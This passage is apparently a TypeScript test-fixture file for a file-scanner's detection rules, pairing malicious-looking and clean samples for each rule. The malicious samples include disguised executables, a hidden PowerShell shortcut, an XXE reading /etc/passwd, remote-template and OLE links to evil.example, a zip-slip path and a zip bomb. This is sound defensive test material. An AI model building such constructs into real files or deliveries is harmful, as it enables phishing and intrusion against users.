/** Positive and negative in-memory fixtures for every rule id. */
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { deflateRawSync } from "node:zlib";
import { zipEntries, zipStored } from "./zip-build.js";

export interface Fix {
  bytes: Uint8Array;
  name: string;
  mime?: string;
  options?: { limits?: Record<string, number> };
}

export type Pair = { positive: Fix; negative: Fix };

const enc = (s: string) => new TextEncoder().encode(s);
const svg = (inner: string) => enc(`<svg xmlns="http://www.w3.org/2000/svg">${inner}</svg>`);
const html = (inner: string) => enc(`<!DOCTYPE html><html><body>${inner}</body></html>`);
const cat = (...parts: Uint8Array[]) => {
  let n = 0;
  for (const p of parts) n += p.length;
  const o = new Uint8Array(n);
  let i = 0;
  for (const p of parts) {
    o.set(p, i);
    i += p.length;
  }
  return o;
};
const utf16 = (s: string) => {
  const u = new Uint8Array(s.length * 2);
  for (let i = 0; i < s.length; i++) {
    u[i * 2] = s.charCodeAt(i) & 0xff;
    u[i * 2 + 1] = s.charCodeAt(i) >> 8;
  }
  return u;
};

function pe(): Uint8Array {
  const b = new Uint8Array(0x200);
  b[0] = 0x4d;
  b[1] = 0x5a;
  new DataView(b.buffer).setUint32(0x3c, 0x80, true);
  b[0x80] = 0x50;
  b[0x81] = 0x45;
  new DataView(b.buffer).setUint16(0x84, 0x14c, true);
  new DataView(b.buffer).setUint16(0x94, 0xe0, true);
  new DataView(b.buffer).setUint16(0x96, 0x0102, true);
  new DataView(b.buffer).setUint16(0x98, 0x10b, true);
  new DataView(b.buffer).setUint16(0x98 + 68, 3, true);
  return b;
}

function lnk(relative: string, args: string, flags = 0x20 | 0x80 | 0x08): Uint8Array {
  const header = new Uint8Array(0x4c);
  new DataView(header.buffer).setUint32(0, 0x4c, true);
  header.set(Uint8Array.from("0114020000000000c000000000000046".match(/../g)!.map((x) => parseInt(x, 16))), 4);
  new DataView(header.buffer).setUint32(0x14, flags, true);
  const str = (s: string) => {
    const u = utf16(s);
    const h = new Uint8Array(2 + u.length);
    new DataView(h.buffer).setUint16(0, s.length, true);
    h.set(u, 2);
    return h;
  };
  return cat(header, str(relative), str(args));
}

function crc32(data: Uint8Array): number {
  let c = ~0;
  for (const x of data) {
    c ^= x;
    for (let k = 0; k < 8; k++) c = c & 1 ? (0xedb88320 ^ (c >>> 1)) : c >>> 1;
  }
  return ~c >>> 0;
}

function pngChunk(type: string, data: Uint8Array): Uint8Array {
  const t = enc(type);
  const len = new Uint8Array(4);
  new DataView(len.buffer).setUint32(0, data.length, false);
  const body = cat(t, data);
  const c = new Uint8Array(4);
  new DataView(c.buffer).setUint32(0, crc32(body), false);
  return cat(len, body, c);
}

function png(w = 1, h = 1, extra: Uint8Array[] = [], trailing?: Uint8Array): Uint8Array {
  const sig = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  const ihdr = new Uint8Array(13);
  new DataView(ihdr.buffer).setUint32(0, w, false);
  new DataView(ihdr.buffer).setUint32(4, h, false);
  ihdr[8] = 8;
  ihdr[9] = 2;
  const parts = [sig, pngChunk("IHDR", ihdr), ...extra, pngChunk("IEND", new Uint8Array(0))];
  if (trailing) parts.push(trailing);
  return cat(...parts);
}

function pdf(objs: string[], trailerExtra = "", eofCount = 1): Uint8Array {
  let body = "%PDF-1.4\n";
  const offs = [0];
  for (let i = 0; i < objs.length; i++) {
    offs.push(body.length);
    body += `${i + 1} 0 obj${objs[i]}endobj\n`;
  }
  const xrefAt = body.length;
  body += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n`;
  for (let i = 1; i <= objs.length; i++) body += `${String(offs[i]).padStart(10, "0")} 00000 n \n`;
  body += `trailer<< /Size ${objs.length + 1} /Root 1 0 R ${trailerExtra}>>\nstartxref\n${xrefAt}\n`;
  for (let i = 0; i < eofCount; i++) body += "%%EOF\n";
  return enc(body);
}

const pagePdf = (extra: string[], catalogExtra = "") =>
  pdf([`<< /Type /Catalog /Pages 2 0 R ${catalogExtra}>>`, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>", "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] >>", ...extra]);

function ooxmlDoc(extraRels = ""): Uint8Array {
  return zipStored({
    "[Content_Types].xml":
      '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
    "_rels/.rels":
      '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
    "word/document.xml":
      '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p/></w:body></w:document>',
    "word/_rels/document.xml.rels": `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${extraRels}</Relationships>`,
  });
}

const disk = join(dirname(fileURLToPath(import.meta.url)), "../fixtures/constructs");
const cleanDir = join(dirname(fileURLToPath(import.meta.url)), "../fixtures/clean");
const loadC = (name: string) => new Uint8Array(readFileSync(join(disk, name)));
const loadClean = (name: string) => new Uint8Array(readFileSync(join(cleanDir, name)));

function hexBytes(arr: number[]): string {
  return arr.map((b) => b.toString(16).padStart(2, "0")).join("");
}

export const RULE_FIXTURES: Record<string, Pair> = {
  TYPE_MISMATCH: {
    positive: { bytes: enc("%PDF-1.4\n%%EOF\n"), name: "photo.png" },
    negative: { bytes: enc("%PDF-1.4\n%%EOF\n"), name: "doc.pdf" },
  },
  EXECUTABLE_DISGUISED: {
    positive: { bytes: pe(), name: "invoice.pdf" },
    negative: { bytes: pe(), name: "tool.exe" },
  },
  ACTIVE_CONTENT_DISGUISED: {
    positive: { bytes: html("<p>x</p><script>1</script>"), name: "pic.png" },
    negative: { bytes: html("<p>x</p>"), name: "page.html" },
  },
  POLYGLOT: {
    positive: { bytes: cat(new Uint8Array([0xff, 0xd8, 0xff, 0xd9]), zipStored({ "x.txt": "hi" })), name: "a.jpg" },
    negative: { bytes: new Uint8Array([0xff, 0xd8, 0xff, 0xd9]), name: "a.jpg" },
  },
  PDF_HEADER_OFFSET: {
    positive: { bytes: enc("XXXX%PDF-1.4\n1 0 obj<<>>endobj\n%%EOF\n"), name: "x.bin" },
    negative: { bytes: enc("%PDF-1.4\n1 0 obj<<>>endobj\n%%EOF\n"), name: "x.pdf" },
  },
  TRAILING_DATA: {
    positive: { bytes: png(1, 1, [], enc("PAYLOAD")), name: "a.png" },
    negative: { bytes: png(1, 1), name: "a.png" },
  },
  FILENAME_BIDI_CONTROL: {
    positive: { bytes: pe(), name: "invoice\u202efdp.exe" },
    negative: { bytes: pe(), name: "invoice.exe" },
  },
  FILENAME_INVISIBLE_CHAR: {
    positive: { bytes: pe(), name: "report\u200b.pdf.exe" },
    negative: { bytes: enc("hi"), name: "report.txt" },
  },
  FILENAME_DOUBLE_EXTENSION: {
    positive: { bytes: pe(), name: "invoice.pdf.exe" },
    negative: { bytes: pe(), name: "invoice.exe" },
  },
  EXECUTABLE: {
    positive: { bytes: pe(), name: "a.exe" },
    negative: { bytes: enc("hello"), name: "a.txt" },
  },
  SCRIPT_FILE: {
    positive: { bytes: enc("Write-Host hi\n"), name: "a.ps1" },
    negative: { bytes: enc("hello"), name: "a.txt" },
  },
  SCRIPT_ENCODED: {
    positive: { bytes: enc("#@~^AAAA\nxx\n"), name: "a.jse" },
    negative: { bytes: enc("var x=1;\n"), name: "a.js" },
  },
  LNK_FILE: {
    positive: { bytes: lnk("notepad.exe", "x.txt"), name: "a.lnk" },
    negative: { bytes: enc("not lnk"), name: "a.txt" },
  },
  LNK_SUSPICIOUS_COMMAND: {
    positive: { bytes: lnk("powershell.exe", "-NoP -W Hidden -c calc"), name: "evil.lnk" },
    negative: { bytes: lnk("notepad.exe", "readme.txt"), name: "doc.lnk" },
  },
  DISK_IMAGE: {
    positive: { bytes: (() => { const b = new Uint8Array(0x9000); b.set(enc("CD001"), 0x8001); return b; })(), name: "disk.iso" },
    negative: { bytes: enc("hi"), name: "a.txt" },
  },
  XML_ENTITY_DECLARATION: {
    positive: { bytes: enc('<?xml version="1.0"?><!DOCTYPE x [ <!ENTITY a "1"> ]><x>&a;</x>'), name: "a.xml" },
    negative: { bytes: enc('<?xml version="1.0"?><x>ok</x>'), name: "a.xml" },
  },
  XML_EXTERNAL_ENTITY: {
    positive: { bytes: enc('<?xml version="1.0"?><!DOCTYPE x [ <!ENTITY a SYSTEM "file:///etc/passwd"> ]><x>&a;</x>'), name: "a.xml" },
    negative: { bytes: enc('<?xml version="1.0"?><!DOCTYPE x [ <!ENTITY a "1"> ]><x>&a;</x>'), name: "a.xml" },
  },
  XML_ENTITY_EXPANSION: {
    positive: { bytes: enc((() => { let d = '<?xml version="1.0"?><!DOCTYPE x [ <!ENTITY a0 "aaaaaaaaaa">'; for (let i = 1; i < 8; i++) d += `<!ENTITY a${i} "&a${i - 1};&a${i - 1};&a${i - 1};&a${i - 1};&a${i - 1};&a${i - 1};&a${i - 1};&a${i - 1};&a${i - 1};&a${i - 1};">`; return d + "]><x>&a7;</x>"; })()), name: "lol.xml" },
    negative: { bytes: enc('<?xml version="1.0"?><!DOCTYPE x [ <!ENTITY a "hi"> ]><x>&a;</x>'), name: "a.xml" },
  },
  XML_EXTERNAL_DTD: {
    positive: { bytes: enc('<?xml version="1.0"?><!DOCTYPE x SYSTEM "http://evil.example/x.dtd"><x/>'), name: "a.xml" },
    negative: { bytes: enc('<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="http://www.w3.org/2000/svg"/>'), name: "a.svg" },
  },
  SVG_SCRIPT: {
    positive: { bytes: svg("<script>alert(1)</script>"), name: "a.svg" },
    negative: { bytes: svg('<rect width="1" height="1"/>'), name: "a.svg" },
  },
  SVG_EVENT_HANDLER: {
    positive: { bytes: svg('<rect onclick="x()"/>'), name: "a.svg" },
    negative: { bytes: svg("<rect/>"), name: "a.svg" },
  },
  SVG_SCRIPT_URL: {
    positive: { bytes: svg('<a href="javascript:alert(1)"><rect/></a>'), name: "a.svg" },
    negative: { bytes: svg('<a href="#f"><rect/></a>'), name: "a.svg" },
  },
  SVG_ANIMATE_SCRIPT_URL: {
    positive: { bytes: svg('<set attributeName="href" to="javascript:alert(1)"/>'), name: "a.svg" },
    negative: { bytes: svg('<set attributeName="opacity" to="0"/>'), name: "a.svg" },
  },
  SVG_FOREIGN_OBJECT_HTML: {
    positive: { bytes: svg('<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>'), name: "a.svg" },
    negative: { bytes: svg("<foreignObject></foreignObject>"), name: "a.svg" },
  },
  SVG_EMBEDDED_CONTENT: {
    positive: { bytes: svg("<iframe/>"), name: "a.svg" },
    negative: { bytes: svg("<g/>"), name: "a.svg" },
  },
  SVG_CSS_ACTIVE: {
    positive: { bytes: svg('<rect style="expression(alert(1))"/>'), name: "a.svg" },
    negative: { bytes: svg('<rect style="fill:red"/>'), name: "a.svg" },
  },
  SVG_EXTERNAL_USE: {
    positive: { bytes: svg('<use href="http://evil.example/x.svg#a"/>'), name: "a.svg" },
    negative: { bytes: svg('<use href="#local"/>'), name: "a.svg" },
  },
  SVG_EXTERNAL_RESOURCE: {
    positive: { bytes: svg('<image href="https://evil.example/x.png"/>'), name: "a.svg" },
    negative: { bytes: svg('<image href="#local"/>'), name: "a.svg" },
  },
  HTML_SCRIPT: {
    positive: { bytes: html("<script>x</script>"), name: "a.html" },
    negative: { bytes: html("<p>hi</p>"), name: "a.html" },
  },
  HTML_SMUGGLING: {
    positive: { bytes: html(`<a download="x.exe"></a><script>const b64="${"A".repeat(5000)}";atob(b64);new Blob([]);a.download="x"</script>`), name: "a.html" },
    negative: { bytes: html('<script>console.log(1)</script>'), name: "a.html" },
  },
  HTML_HTA: {
    positive: { bytes: enc("<html><hta:application applicationname='x'/><script>x</script></html>"), name: "a.hta" },
    negative: { bytes: html("<p>hi</p>"), name: "a.html" },
  },
  HTML_CREDENTIAL_FORM: {
    positive: { bytes: html('<input type="password"/>'), name: "a.html" },
    negative: { bytes: html('<input type="text"/>'), name: "a.html" },
  },
  HTML_OBFUSCATED_SCRIPT: {
    positive: { bytes: html("<script>eval(atob('YQ=='))</script>"), name: "a.html" },
    negative: { bytes: html("<script>console.log(1)</script>"), name: "a.html" },
  },
  HTML_REDIRECT: {
    positive: { bytes: html('<meta http-equiv="refresh" content="0;url=https://evil.example/">'), name: "a.html" },
    negative: { bytes: html("<p>hi</p>"), name: "a.html" },
  },
  PDF_JAVASCRIPT: {
    positive: { bytes: pagePdf(['<< /S /JavaScript /JS (app.alert\\(1\\);) >>'], '/OpenAction 4 0 R '), name: "js.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_OPEN_ACTION: {
    positive: { bytes: pagePdf(['<< /S /URI /URI (https://example.com/) >>'], '/OpenAction 4 0 R '), name: "oa.pdf" },
    negative: { bytes: pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] >>']), name: "view.pdf" },
  },
  PDF_ADDITIONAL_ACTIONS: {
    positive: { bytes: pagePdf(['<< /S /JavaScript /JS (1) >>'], '/AA << /O 4 0 R >> '), name: "aa.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_LAUNCH: {
    positive: { bytes: pagePdf(['<< /S /Launch /F (cmd.exe) >>'], '/OpenAction 4 0 R '), name: "launch.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_EMBEDDED_FILE: {
    positive: { bytes: pagePdf(['<< /Type /Filespec /F (x.bin) /EF << /F 5 0 R >> >>', '<< /Type /EmbeddedFile /Length 3 >>stream\nMZ!\nendstream\n'], '/Names << /EmbeddedFiles << /Names [(x) 4 0 R] >> >> '), name: "emb.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_SUSPICIOUS_URI: {
    positive: { bytes: pdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', '<< /Type /Page /Parent 2 0 R /Annots [4 0 R] /MediaBox [0 0 1 1] >>', '<< /Subtype /Link /A << /S /URI /URI (javascript:alert\\(1\\)) >> >>']), name: "uri.pdf" },
    negative: { bytes: pdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', '<< /Type /Page /Parent 2 0 R /Annots [4 0 R] /MediaBox [0 0 1 1] >>', '<< /Subtype /Link /A << /S /URI /URI (https://example.com/) >> >>']), name: "link.pdf" },
  },
  PDF_SUBMIT_FORM: {
    positive: { bytes: pagePdf(['<< /S /SubmitForm /F << /F (https://evil.example/) >> >>'], '/OpenAction 4 0 R '), name: "sub.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_IMPORT_DATA: {
    positive: { bytes: pagePdf(['<< /S /ImportData /F (data.xfdf) >>'], '/OpenAction 4 0 R '), name: "imp.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_REMOTE_GOTO: {
    positive: { bytes: pagePdf(['<< /S /GoToR /F (other.pdf) /D [0 /Fit] >>'], '/OpenAction 4 0 R '), name: "goto.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_RICH_MEDIA: {
    positive: { bytes: pdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', '<< /Type /Page /Parent 2 0 R /Annots [4 0 R] /MediaBox [0 0 1 1] >>', '<< /Subtype /RichMedia >>']), name: "rm.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_XFA: {
    positive: { bytes: pagePdf(['<< /Length 5 >>stream\n<xml/>\nendstream\n'], '/AcroForm << /XFA 4 0 R >> '), name: "xfa.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_JBIG2: {
    positive: { bytes: pagePdf(['<< /Filter /JBIG2Decode /Length 1 >>stream\nx\nendstream\n']), name: "jbig.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_ENCRYPTED: {
    positive: { bytes: pdf(["<< /Type /Catalog /Pages 2 0 R >>", "<< /Type /Pages /Kids [3 0 R] /Count 1 >>", "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] >>"], "/Encrypt 4 0 R"), name: "enc.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  PDF_OBFUSCATED_NAME: {
    positive: { bytes: pagePdf(['<< /S /J#61vaScript /JS (1) >>'], '/OpenAction 4 0 R '), name: "obf.pdf" },
    negative: { bytes: pagePdf(['<< /S /JavaScript /JS (1) >>'], '/OpenAction 4 0 R '), name: "plain.pdf" },
  },
  PDF_INCREMENTAL_UPDATE: {
    positive: { bytes: pdf(["<< /Type /Catalog /Pages 2 0 R >>", "<< /Type /Pages /Kids [3 0 R] /Count 1 >>", "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] >>"], "", 2), name: "inc.pdf" },
    negative: { bytes: pdf(["<< /Type /Catalog /Pages 2 0 R >>", "<< /Type /Pages /Kids [3 0 R] /Count 1 >>", "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] >>"], "", 1), name: "c.pdf" },
  },
  PDF_MALFORMED: {
    positive: { bytes: enc("%PDF-1.4\nnot really a pdf\n"), name: "bad.pdf" },
    negative: { bytes: pagePdf([]), name: "c.pdf" },
  },
  ARCHIVE_PATH_TRAVERSAL: {
    positive: { bytes: zipStored({ "../evil.txt": "x" }), name: "slip.zip" },
    negative: { bytes: zipStored({ "ok.txt": "x" }), name: "ok.zip" },
  },
  ARCHIVE_SYMLINK: {
    positive: { bytes: zipEntries([{ name: "link", data: enc("t"), externalAttr: (0xa000 << 16) >>> 0, madeBy: 0x0314 }]), name: "sym.zip" },
    negative: { bytes: zipStored({ "ok.txt": "x" }), name: "ok.zip" },
  },
  ARCHIVE_ENCRYPTED: {
    positive: { bytes: zipEntries([{ name: "secret.txt", data: enc("xxxx"), flags: 1 }]), name: "enc.zip" },
    negative: { bytes: zipStored({ "ok.txt": "x" }), name: "ok.zip" },
  },
  ARCHIVE_BOMB: {
    positive: { bytes: zipEntries([{ name: "bomb.txt", data: new Uint8Array(deflateRawSync(new Uint8Array(200))), method: 8, csize: 20, usize: 50_000_000 }]), name: "bomb.zip" },
    negative: { bytes: zipStored({ "ok.txt": "x" }), name: "ok.zip" },
  },
  ARCHIVE_OVERLAPPING_ENTRIES: {
    positive: { bytes: zipEntries([{ name: "a.txt", data: enc("hello") }, { name: "b.txt", data: enc("hello"), localOffset: 0 }]), name: "overlap.zip" },
    negative: { bytes: zipStored({ "a.txt": "x", "b.txt": "y" }), name: "ok.zip" },
  },
  ARCHIVE_DUPLICATE_NAMES: {
    positive: { bytes: zipEntries([{ name: "a.txt", data: enc("1") }, { name: "a.txt", data: enc("2") }]), name: "dup.zip" },
    negative: { bytes: zipStored({ "a.txt": "1", "b.txt": "2" }), name: "ok.zip" },
  },
  ARCHIVE_HEADER_MISMATCH: {
    positive: { bytes: zipEntries([{ name: "a.txt", data: enc("hello world"), method: 0, usize: 3, csize: 11, crc: 1 }]), name: "mis.zip" },
    negative: { bytes: zipStored({ "a.txt": "hi" }), name: "ok.zip" },
  },
  ARCHIVE_UNSUPPORTED: {
    positive: { bytes: new Uint8Array([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0, 0]), name: "a.7z" },
    negative: { bytes: zipStored({ "a.txt": "hi" }), name: "ok.zip" },
  },
  ARCHIVE_CORRUPT: {
    positive: { bytes: new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0, 0, 0, 0]), name: "bad.zip" },
    negative: { bytes: zipStored({ "a.txt": "hi" }), name: "ok.zip" },
  },
  ARCHIVE_NESTED: {
    positive: { bytes: zipStored({ "inner.zip": zipStored({ "x.txt": "hi" }) }), name: "nest.zip" },
    negative: { bytes: zipStored({ "x.txt": "hi" }), name: "ok.zip" },
  },
  OFFICE_VBA_MACROS: {
    positive: { bytes: loadC("macro.docm"), name: "macro.docm" },
    negative: { bytes: ooxmlDoc(), name: "clean.bin" },
  },
  VBA_AUTOEXEC: {
    positive: { bytes: loadC("macro.docm"), name: "macro.docm" },
    negative: { bytes: ooxmlDoc(), name: "clean.bin" },
  },
  VBA_SUSPICIOUS: {
    positive: { bytes: loadC("macro.doc"), name: "macro.doc" },
    negative: { bytes: ooxmlDoc(), name: "clean.bin" },
  },
  XLM_MACRO_SHEET: {
    positive: { bytes: loadC("xlm.xls"), name: "xlm.xls" },
    negative: { bytes: ooxmlDoc(), name: "clean.bin" },
  },
  XLM_AUTO_OPEN: {
    positive: { bytes: loadC("xlm.xls"), name: "xlm.xls" },
    negative: { bytes: ooxmlDoc(), name: "clean.bin" },
  },
  OFFICE_DDE: {
    positive: { bytes: loadC("dde.docx"), name: "dde.docx" },
    negative: { bytes: ooxmlDoc(), name: "clean.bin" },
  },
  OLE_EQUATION_EDITOR: {
    positive: { bytes: loadC("rtf-equation.rtf"), name: "rtf-equation.rtf" },
    negative: { bytes: enc("{\\rtf1\\ansi hi}"), name: "clean.bin" },
  },
  RTF_OLE_OBJECT: {
    positive: { bytes: loadC("rtf-equation.rtf"), name: "rtf-equation.rtf" },
    negative: { bytes: enc("{\\rtf1\\ansi hi}"), name: "clean.bin" },
  },
  RTF_OBJUPDATE: {
    positive: { bytes: loadC("rtf-equation.rtf"), name: "rtf-equation.rtf" },
    negative: { bytes: enc("{\\rtf1\\ansi hi}"), name: "clean.bin" },
  },
  OFFICE_MACRO_CONTENT_TYPE: {
    positive: { bytes: zipStored({
      "[Content_Types].xml": '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
      "_rels/.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
      "word/document.xml": '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>',
      "word/_rels/document.xml.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdV" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>',
      "word/vbaProject.bin": cat(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), new Uint8Array(504)),
    }), name: "mismatch.docx" },
    negative: { bytes: ooxmlDoc(), name: "clean.docx" },
  },
  OOXML_REMOTE_TEMPLATE: {
    positive: { bytes: loadC("remote-template.docx"), name: "remote-template.docx" },
    negative: { bytes: ooxmlDoc(), name: "clean.docx" },
  },
  OOXML_EXTERNAL_OLE_LINK: {
    positive: { bytes: ooxmlDoc('<Relationship Id="rIdOle" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="https://evil.example/x.bin" TargetMode="External"/>'), name: "ole.docx" },
    negative: { bytes: ooxmlDoc(), name: "clean.docx" },
  },
  OOXML_EXTERNAL_FRAME: {
    positive: { bytes: ooxmlDoc('<Relationship Id="rIdF" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="https://evil.example/f.html" TargetMode="External"/>'), name: "frame.docx" },
    negative: { bytes: ooxmlDoc(), name: "clean.docx" },
  },
  OOXML_SUSPICIOUS_SCHEME: {
    positive: { bytes: ooxmlDoc('<Relationship Id="rIdM" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="ms-msdt:x" TargetMode="External"/>'), name: "msdt.docx" },
    negative: { bytes: ooxmlDoc('<Relationship Id="rIdH" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/" TargetMode="External"/>'), name: "link.docx" },
  },
  OOXML_EXTERNAL_RELATIONSHIP: {
    positive: { bytes: ooxmlDoc('<Relationship Id="rIdI" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://evil.example/i.png" TargetMode="External"/>'), name: "ext.docx" },
    negative: { bytes: ooxmlDoc('<Relationship Id="rIdH" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/" TargetMode="External"/>'), name: "link.docx" },
  },
  OOXML_ACTIVEX: {
    positive: { bytes: zipStored({
      "[Content_Types].xml": '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/activeX/activeX1.xml" ContentType="application/vnd.ms-office.activeX+xml"/></Types>',
      "_rels/.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
      "word/document.xml": '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>',
      "word/_rels/document.xml.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>',
      "word/activeX/activeX1.xml": '<?xml version="1.0"?><ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX"/>',
    }), name: "ax.docx" },
    negative: { bytes: ooxmlDoc(), name: "clean.docx" },
  },
  OOXML_EMBEDDED_OBJECT: {
    positive: { bytes: zipStored({
      "[Content_Types].xml": '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
      "_rels/.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
      "word/document.xml": '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>',
      "word/_rels/document.xml.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>',
      "word/embeddings/oleObject1.bin": cat(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), new Uint8Array(120)),
    }), name: "emb.docx" },
    negative: { bytes: ooxmlDoc(), name: "clean.docx" },
  },
  OOXML_CUSTOM_XML: {
    positive: { bytes: loadClean("clean.docx"), name: "clean.docx" },
    negative: { bytes: ooxmlDoc(), name: "plain.docx" },
  },
  OLE_PACKAGE: {
    positive: { bytes: enc("{\\rtf1\\ansi{\\object\\objemb{\\*\\objclass Package}{\\*\\objdata 0105000002000000080000005061636b61676500010000000001000000002600000002006576696c2e65786500433a5c6576696c2e65786500000000000100000000020000004d5a}}}"), name: "pkg.rtf" },
    negative: { bytes: enc("{\\rtf1\\ansi hi}"), name: "clean.rtf" },
  },
  OFFICE_ENCRYPTED: {
    positive: { bytes: loadC("macro.doc") /* replaced in hydrate */, name: "enc.bin" },
    negative: { bytes: ooxmlDoc(), name: "clean.docx" },
  },
  RTF_REMOTE_TEMPLATE: {
    positive: { bytes: enc("{\\rtf1\\ansi{\\*\\template https://evil.example/t.dotm}\\pard hi}"), name: "t.rtf" },
    negative: { bytes: enc("{\\rtf1\\ansi hi}"), name: "clean.rtf" },
  },
  RTF_OBFUSCATION: {
    positive: { bytes: enc("{\\rt{\\pard hi}}"), name: "obf.rtf" },
    negative: { bytes: enc("{\\rtf1\\ansi hi}"), name: "clean.rtf" },
  },
  IMAGE_DIMENSIONS_BOMB: {
    positive: { bytes: png(0xffff, 0xffff), name: "bomb.png" },
    negative: { bytes: png(1, 1), name: "ok.png" },
  },
  IMAGE_EMBEDDED_CODE: {
    positive: { bytes: png(1, 1, [pngChunk("tEXt", enc("Comment\0<script>alert(1)</script>"))]), name: "code.png" },
    negative: { bytes: png(1, 1), name: "ok.png" },
  },
  IMAGE_MALFORMED: {
    positive: { bytes: (() => { const p = png(1, 1); const q = p.slice(); q[q.length - 5] = ((q[q.length - 5] ?? 0) ^ 0xff) & 0xff; return q; })(), name: "bad.png" },
    negative: { bytes: png(1, 1), name: "ok.png" },
  },
  EICAR_TEST_FILE: {
